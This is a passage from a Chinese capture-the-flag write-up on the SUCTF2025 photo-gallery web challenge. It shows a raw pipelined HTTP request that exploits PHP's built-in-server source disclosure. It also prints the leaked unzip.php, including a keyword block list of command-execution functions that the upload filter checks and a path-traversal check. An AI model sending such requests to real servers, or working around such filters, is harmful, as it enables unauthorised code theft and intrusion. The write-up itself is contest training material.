</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>C:\Users\baozhongqi\Desktop\SUCTF2025\SU_photogallery\SU_photogallery
</span></span></code></pre></td></tr></table></div></div><p>然后直接启动即可，现在的问题就是进来之后就一个上传图片的口子，先扫一下看看有没有提示，扫出来一个<code>robots.txt</code>，源码里面也没有什么东西，访问之后得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>User-agent: *
</span></span><span class=line><span class=cl>see see node.md
</span></span></code></pre></td></tr></table></div></div><p>访问<code>/node.md</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>书鱼哥哥交给我个任务，让我写一个su的图库来存放战队的美好回忆，我需要测试我开发的代码，于是我在服务器上测试，但是我测试的时候并不想大费周章改变我原本配置的环境。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1：可以提交一张图片（Working）
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2：通过提交压缩包来批量提交图片
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>3...
</span></span></code></pre></td></tr></table></div></div><p>那么就是两个选择，一个是交图片一个是交压缩包，上传文件之后莫名其妙搞到报错了</p><p><img src=/p/suctf2025/QQ20250113-182719.jpg width=975 height=421 srcset="/p/suctf2025/QQ20250113-182719_hu_51491e43fbba7559.jpg 480w, /p/suctf2025/QQ20250113-182719_hu_25e863679f62babd.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=231 data-flex-basis=555px></p><p>让我回想起了一道ctfshow使用php内置服务器启动的题目，然后上网搜索，找到源码泄露漏洞</p><p><img src=/p/suctf2025/QQ20250113-183811.jpg width=1430 height=748 srcset="/p/suctf2025/QQ20250113-183811_hu_2832f7b7f9864b8.jpg 480w, /p/suctf2025/QQ20250113-183811_hu_f1fbb45bf2629f9b.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=191 data-flex-basis=458px></p><p>但是对于利用方式没想到<code>index.php</code>居然不存在，后面随便上传一个文件知道是<code>unzip.php</code>，其中还有细节是要修改bp的一个更新content-length的功能</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/phpinfo.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>156.238.233.93</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>GET /Kawakaze HTTP/1.1
</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/suctf2025/QQ20250113-185152.jpg width=927 height=564 srcset="/p/suctf2025/QQ20250113-185152_hu_df74fdcd311c6a05.jpg 480w, /p/suctf2025/QQ20250113-185152_hu_b24f1a487e934b16.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=164 data-flex-basis=394px></p><p>读取成功之后把参数名换了拿到源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/unzip.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>156.238.233.93</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>GET /test.txt HTTP/1.1
</span></span></span></code></pre></td></tr></table></div></div><p>注意格式不要错</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>get_extension</span><span class=p>(</span><span class=nv>$filename</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>pathinfo</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span> <span class=nx>PATHINFO_EXTENSION</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>check_extension</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span><span class=nv>$path</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filePath</span> <span class=o>=</span> <span class=nv>$path</span> <span class=o>.</span> <span class=nx>DIRECTORY_SEPARATOR</span> <span class=o>.</span> <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_file</span><span class=p>(</span><span class=nv>$filePath</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$extension</span> <span class=o>=</span> <span class=nx>strtolower</span><span class=p>(</span><span class=nx>get_extension</span><span class=p>(</span><span class=nv>$filename</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$extension</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;jpg&#39;</span><span class=p>,</span> <span class=s1>&#39;jpeg&#39;</span><span class=p>,</span> <span class=s1>&#39;png&#39;</span><span class=p>,</span> <span class=s1>&#39;gif&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>unlink</span><span class=p>(</span><span class=nv>$filePath</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// echo &#34;Fail to delete file: $filename\n&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// echo &#34;This file format is not supported:$extension\n&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// echo &#34;nofile&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>file_rename</span> <span class=p>(</span><span class=nv>$path</span><span class=p>,</span><span class=nv>$file</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$randomName</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nx>uniqid</span><span class=p>()</span><span class=o>.</span><span class=nx>rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>99999</span><span class=p>))</span> <span class=o>.</span> <span class=s1>&#39;.&#39;</span> <span class=o>.</span> <span class=nx>get_extension</span><span class=p>(</span><span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nv>$oldPath</span> <span class=o>=</span> <span class=nv>$path</span> <span class=o>.</span> <span class=nx>DIRECTORY_SEPARATOR</span> <span class=o>.</span> <span class=nv>$file</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nv>$newPath</span> <span class=o>=</span> <span class=nv>$path</span> <span class=o>.</span> <span class=nx>DIRECTORY_SEPARATOR</span> <span class=o>.</span> <span class=nv>$randomName</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>rename</span><span class=p>(</span><span class=nv>$oldPath</span><span class=p>,</span> <span class=nv>$newPath</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>unlink</span><span class=p>(</span><span class=nv>$path</span> <span class=o>.</span> <span class=nx>DIRECTORY_SEPARATOR</span> <span class=o>.</span> <span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=c1>// echo &#34;Fail to rename file: $file\n&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>move_file</span><span class=p>(</span><span class=nv>$path</span><span class=p>,</span><span class=nv>$basePath</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nx>glob</span><span class=p>(</span><span class=nv>$path</span> <span class=o>.</span> <span class=nx>DIRECTORY_SEPARATOR</span> <span class=o>.</span> <span class=s1>&#39;*&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=nv>$file</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$destination</span> <span class=o>=</span> <span class=nv>$basePath</span> <span class=o>.</span> <span class=nx>DIRECTORY_SEPARATOR</span> <span class=o>.</span> <span class=nx>basename</span><span class=p>(</span><span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>rename</span><span class=p>(</span><span class=nv>$file</span><span class=p>,</span> <span class=nv>$destination</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=c1>// echo &#34;Fail to rename file: $file\n&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>check_base</span><span class=p>(</span><span class=nv>$fileContent</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$keywords</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;eval&#39;</span><span class=p>,</span> <span class=s1>&#39;base64&#39;</span><span class=p>,</span> <span class=s1>&#39;shell_exec&#39;</span><span class=p>,</span> <span class=s1>&#39;system&#39;</span><span class=p>,</span> <span class=s1>&#39;passthru&#39;</span><span class=p>,</span> <span class=s1>&#39;assert&#39;</span><span class=p>,</span> <span class=s1>&#39;flag&#39;</span><span class=p>,</span> <span class=s1>&#39;exec&#39;</span><span class=p>,</span> <span class=s1>&#39;phar&#39;</span><span class=p>,</span> <span class=s1>&#39;xml&#39;</span><span class=p>,</span> <span class=s1>&#39;DOCTYPE&#39;</span><span class=p>,</span> <span class=s1>&#39;iconv&#39;</span><span class=p>,</span> <span class=s1>&#39;zip&#39;</span><span class=p>,</span> <span class=s1>&#39;file&#39;</span><span class=p>,</span> <span class=s1>&#39;chr&#39;</span><span class=p>,</span> <span class=s1>&#39;hex2bin&#39;</span><span class=p>,</span> <span class=s1>&#39;dir&#39;</span><span class=p>,</span> <span class=s1>&#39;function&#39;</span><span class=p>,</span> <span class=s1>&#39;pcntl_exec&#39;</span><span class=p>,</span> <span class=s1>&#39;array&#39;</span><span class=p>,</span> <span class=s1>&#39;include&#39;</span><span class=p>,</span> <span class=s1>&#39;require&#39;</span><span class=p>,</span> <span class=s1>&#39;call_user_func&#39;</span><span class=p>,</span> <span class=s1>&#39;getallheaders&#39;</span><span class=p>,</span> <span class=s1>&#39;get_defined_vars&#39;</span><span class=p>,</span><span class=s1>&#39;info&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$base64_keywords</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$keywords</span> <span class=k>as</span> <span class=nv>$keyword</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$base64_keywords</span><span class=p>[]</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$keyword</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$base64_keywords</span> <span class=k>as</span> <span class=nv>$base64_keyword</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$fileContent</span><span class=p>,</span> <span class=nv>$base64_keyword</span><span class=p>)</span><span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>           <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>check_content</span><span class=p>(</span><span class=nv>$zip</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>numFiles</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$fileInfo</span> <span class=o>=</span> <span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>statIndex</span><span class=p>(</span><span class=nv>$i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$fileName</span> <span class=o>=</span> <span class=nv>$fileInfo</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/\.\.(\/|\.|%2e%2e%2f)/i&#39;</span><span class=p>,</span> <span class=nv>$fileName</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>false</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=c1>// echo &#34;Checking file: $fileName\n&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$fileContent</span> <span class=o>=</span> <span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>getFromName</span><span class=p>(</span><span class=nv>$fileName</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i&#39;</span><span class=p>,</span> <span class=nv>$fileContent</span><span class=p>)</span> <span class=o>||</span> <span class=nx>check_base</span><span class=p>(</span><span class=nv>$fileContent</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// echo &#34;Don&#39;t hack me!\n&#34;;    
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>unzip</span><span class=p>(</span><span class=nv>$zipname</span><span class=p>,</span> <span class=nv>$basePath</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$zip</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ZipArchive</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$zipname</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// echo &#34;Zip file does not exist&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s2>&#34;zip_not_found&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>open</span><span class=p>(</span><span class=nv>$zipname</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// echo &#34;Fail to open zip file&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s2>&#34;zip_open_failed&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>check_content</span><span class=p>(</span><span class=nv>$zip</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;malicious_content_detected&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$randomDir</span> <span class=o>=</span> <span class=s1>&#39;tmp_&#39;</span><span class=o>.</span><span class=nx>md5</span><span class=p>(</span><span class=nx>uniqid</span><span class=p>()</span><span class=o>.</span><span class=nx>rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>99999</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$path</span> <span class=o>=</span> <span class=nv>$basePath</span> <span class=o>.</span> <span class=nx>DIRECTORY_SEPARATOR</span> <span class=o>.</span> <span class=nv>$randomDir</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>mkdir</span><span class=p>(</span><span class=nv>$path</span><span class=p>,</span> <span class=mo>0777</span><span class=p>,</span> <span class=k>true</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// echo &#34;Fail to create directory&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;mkdir_failed&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>extractTo</span><span class=p>(</span><span class=nv>$path</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// echo &#34;Fail to extract zip file&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>numFiles</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$fileInfo</span> <span class=o>=</span> <span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>statIndex</span><span class=p>(</span><span class=nv>$i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$fileName</span> <span class=o>=</span> <span class=nv>$fileInfo</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>check_extension</span><span class=p>(</span><span class=nv>$fileName</span><span class=p>,</span> <span class=nv>$path</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// echo &#34;Unsupported file extension&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>file_rename</span><span class=p>(</span><span class=nv>$path</span><span class=p>,</span> <span class=nv>$fileName</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// echo &#34;File rename failed&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>move_file</span><span class=p>(</span><span class=nv>$path</span><span class=p>,</span> <span class=nv>$basePath</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=c1>// echo &#34;Fail to move file&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s2>&#34;move_failed&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>rmdir</span><span class=p>(</span><span class=nv>$path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$uploadDir</span> <span class=o>=</span> <span class=no>__DIR__</span> <span class=o>.</span> <span class=nx>DIRECTORY_SEPARATOR</span> <span class=o>.</span> <span class=s1>&#39;upload/suimages/&#39;</span><span class=p>;</span>
